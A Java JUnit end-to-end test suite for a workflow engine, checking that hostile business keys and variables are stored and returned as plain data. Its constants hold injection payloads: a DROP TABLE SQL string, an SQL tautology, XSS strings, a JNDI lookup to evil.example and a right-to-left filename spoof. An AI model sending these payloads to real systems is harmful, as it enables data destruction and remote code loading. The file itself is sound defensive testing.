package io.mateu.workflow.e2e;

import io.mateu.workflow.domain.aggregates.ProcessStatus;
import io.mateu.workflow.dtos.Variable;
import io.mateu.workflow.e2e.support.AbstractJpaE2eTest;
import io.mateu.workflow.e2e.support.TestWorker;
import io.mateu.workflow.input.InputLimits;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;

import static io.mateu.workflow.e2e.support.TestWorker.var;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * HARD-IN-01..09 — what a caller can put in a process and what the engine must do with it.
 *
 * <p>A business key and a process variable are whatever the caller sends: they come from an
 * upstream Kafka record, the REST message API, an MCP call or a form a person filled in, and none
 * of those is the engine's own code. The rule this suite pins is that <b>the engine treats them as
 * data and nothing else</b> — a value that looks like SQL is a value, a value that looks like a
 * script tag is a value — and that it stores and returns them exactly as they were sent.
 *
 * <p>Against a real database rather than the memory store, because injection is a property of how a
 * statement is built and a memory map cannot have that bug at all. H2 in PostgreSQL mode runs the
 * real JPA repositories, the real outbox and the real relay.
 */
class HostileInputJpaE2eTest extends AbstractJpaE2eTest {

    @Autowired JdbcTemplate jdbc;

    /** Payloads chosen for the layer each one attacks, all carried as ordinary process data. */
    private static final String SQL_DROP = "'; DROP TABLE process_entity; --";
    private static final String SQL_TAUTOLOGY = "x' OR '1'='1";
    private static final String XSS = "<script>alert(document.cookie)</script>";
    private static final String XSS_ATTRIBUTE = "\" onmouseover=\"alert(1)";
    private static final String TEMPLATE = "${jndi:ldap://evil.example/a}";
    private static final String UNICODE = "😀 مرحبا ‮gnp.exe ünïcödé";

    /**
     * HARD-IN-01. The business key is the one caller-supplied string the engine looks processes up
     * by, so it reaches a WHERE clause on every path. A key that is a DROP statement must run the
     * process and leave the schema standing.
     */
    @Test
    void aBusinessKeyThatIsAnSqlStatementIsAKeyAndNotAStatement() {
        worker.on("s1", TestWorker.succeed());
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());

        createProcess("sequential-3", SQL_DROP);
        awaitStatus(SQL_DROP, ProcessStatus.COMPLETED);

        assertThat(tableExists("process_entity"))
                .as("the table the business key asked to drop must still be there")
                .isTrue();
        assertThat(process(SQL_DROP).getBusinessKey())
                .as("and the key must come back as it was sent, neither escaped nor mangled")
                .isEqualTo(SQL_DROP);
    }

    /**
     * HARD-IN-02. The other half of an injection: a key crafted to widen a lookup must match its
     * own process and nothing else, or a caller could read or drive processes that are not theirs.
     */
    @Test
    void aTautologyInTheBusinessKeyMatchesOnlyItsOwnProcess() {
        worker.on("s1", TestWorker.succeed());
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());

        createProcess("sequential-3", "ordinary-key");
        awaitStatus("ordinary-key", ProcessStatus.COMPLETED);
        createProcess("sequential-3", SQL_TAUTOLOGY);
        awaitStatus(SQL_TAUTOLOGY, ProcessStatus.COMPLETED);

        assertThat(process(SQL_TAUTOLOGY).getBusinessKey()).isEqualTo(SQL_TAUTOLOGY);
        assertThat(process(SQL_TAUTOLOGY).getId())
                .as("a tautology must not fold two processes into one lookup")
                .isNotEqualTo(process("ordinary-key").getId());
    }

    /**
     * HARD-IN-03. Variables are the payload the whole engine passes around — into step JSON, into
     * the outbox, back out to workers. Every classic payload must survive that round trip byte for
     * byte: escaping on the way in is how a value silently stops being the value that was sent.
     */
    @Test
    void hostileVariableValuesRoundTripExactlyAsSent() {
        worker.on("s1", TestWorker.succeed());
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());

        createProcess("sequential-3", "hostile-vars",
                new Variable("sql", SQL_DROP),
                new Variable("xss", XSS),
                new Variable("attr", XSS_ATTRIBUTE),
                new Variable("template", TEMPLATE),
                new Variable("unicode", UNICODE));
        awaitStatus("hostile-vars", ProcessStatus.COMPLETED);

        assertThat(valueOf("hostile-vars", "sql")).isEqualTo(SQL_DROP);
        assertThat(valueOf("hostile-vars", "xss")).isEqualTo(XSS);
        assertThat(valueOf("hostile-vars", "attr")).isEqualTo(XSS_ATTRIBUTE);
        assertThat(valueOf("hostile-vars", "template")).isEqualTo(TEMPLATE);
        assertThat(valueOf("hostile-vars", "unicode")).isEqualTo(UNICODE);
        assertThat(tableExists("process_entity")).isTrue();
    }

    /**
     * HARD-IN-04. The same, written by a worker mid-flight rather than supplied at creation — the
     * other direction, and the one that goes through the step-update pipeline and the outbox.
     */
    @Test
    void aWorkerCanWriteBackHostileValuesAndTheFlowContinues() {
        worker.on("s1", TestWorker.succeed(var("fromWorker", SQL_DROP), var("alsoFromWorker", XSS)));
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());

        createProcess("sequential-3", "hostile-writeback");
        awaitStatus("hostile-writeback", ProcessStatus.COMPLETED);

        assertThat(valueOf("hostile-writeback", "fromWorker")).isEqualTo(SQL_DROP);
        assertThat(valueOf("hostile-writeback", "alsoFromWorker")).isEqualTo(XSS);
    }

    /**
     * HARD-IN-05. A variable name is caller-supplied too, and it is the one that becomes an
     * identifier — a key in the JEXL context every guard is evaluated in. A name that reads as an
     * expression must stay a name.
     */
    @Test
    void aVariableNameThatLooksLikeCodeIsStillJustAName() {
        worker.on("s1", TestWorker.succeed());
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());

        createProcess("sequential-3", "hostile-names",
                new Variable("'; DROP TABLE process_entity; --", "1"),
                new Variable("process.status", "tampered"),
                new Variable("system", "tampered"));
        awaitStatus("hostile-names", ProcessStatus.COMPLETED);

        assertThat(process("hostile-names").getStatus())
                .as("a variable called process.status must not be able to become the status")
                .isEqualTo(ProcessStatus.COMPLETED);
        assertThat(tableExists("process_entity")).isTrue();
    }

    /**
     * HARD-IN-06. Size. A megabyte in one variable is well past anything sensible and well short of
     * what a caller could send, and the columns are TEXT precisely so it fits (see
     * {@code UnboundedColumnsSchemaE2eTest}). What is asserted is that it survives whole: a value
     * silently truncated at some column width is worse than one refused, because the process then
     * runs on data that is not what anybody sent.
     */
    @Test
    void aVeryLargeVariableSurvivesTheRoundTripWhole() {
        worker.on("s1", TestWorker.succeed());
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());
        var oneMegabyte = "0123456789abcdef".repeat(64 * 1024);

        createProcess("sequential-3", "huge-variable", new Variable("payload", oneMegabyte));
        awaitStatus("huge-variable", ProcessStatus.COMPLETED);

        assertThat(valueOf("huge-variable", "payload")).hasSize(oneMegabyte.length());
        assertThat(valueOf("huge-variable", "payload")).isEqualTo(oneMegabyte);
    }

    /**
     * HARD-IN-06b. The other side of the same line: past the ceiling the creation is refused, and
     * refused <em>before</em> a process exists — nothing half-created, nothing to clean up. Where
     * this arrives from decides what happens to the refusal and neither answer is a truncation: a
     * Kafka record is parked on the dead-letter destination (it will be this size on every
     * redelivery, so retrying it is a loop), a REST caller is answered 400, and a person filling in
     * a form is shown the message. Here, in embedded mode, it reaches the caller.
     */
    @Test
    void aVariableThatIsAbsurdRatherThanMerelyLargeIsRefusedAndNoProcessIsCreated() {
        var overTheCeiling = "x".repeat(InputLimits.MAX_VALUE_LENGTH + 1);

        assertThatThrownBy(() -> createProcess("sequential-3", "absurd-variable",
                new Variable("payload", overTheCeiling)))
                .isInstanceOf(InputLimits.InputRejectedException.class)
                .hasMessageContaining("payload");

        assertThat(processOpt("absurd-variable")).isEmpty();
    }

    /**
     * HARD-IN-07. Bytes that are not text. A NUL is legal in a Java String and illegal in a
     * PostgreSQL {@code text} column, so a variable carrying one is the one payload that does not
     * fail in the engine at all — it fails in the driver, inside the transaction that was saving a
     * running process, which is a far worse place for it. Whatever the store does with it, what
     * must not happen is a process left mid-flight with no way forward.
     */
    @Test
    void controlCharactersDoNotWedgeAProcessMidFlight() {
        worker.on("s1", TestWorker.succeed());
        worker.on("s2", TestWorker.succeed());
        worker.on("s3", TestWorker.succeed());

        createProcess("sequential-3", "control-chars",
                new Variable("nul", "before\u0000after"),
                new Variable("bell", "\u0007\u001b[31m"),
                new Variable("newlines", "line1\r\nline2\u2028line3"));

        awaitStatus("control-chars", ProcessStatus.COMPLETED);
        assertThat(valueOf("control-chars", "newlines")).isEqualTo("line1\r\nline2\u2028line3");
    }

    private String valueOf(String businessKey, String variableName) {
        return process(businessKey).getVariables().stream()
                .filter(v -> variableName.equals(v.name()))
                .map(io.mateu.workflow.domain.aggregates.Variable::value)
                .findFirst().orElse(null);
    }

    private boolean tableExists(String table) {
        Long count = jdbc.queryForObject("""
                select count(*) from information_schema.tables where lower(table_name) = lower(?)
                """, Long.class, table);
        return count != null && count > 0;
    }
}
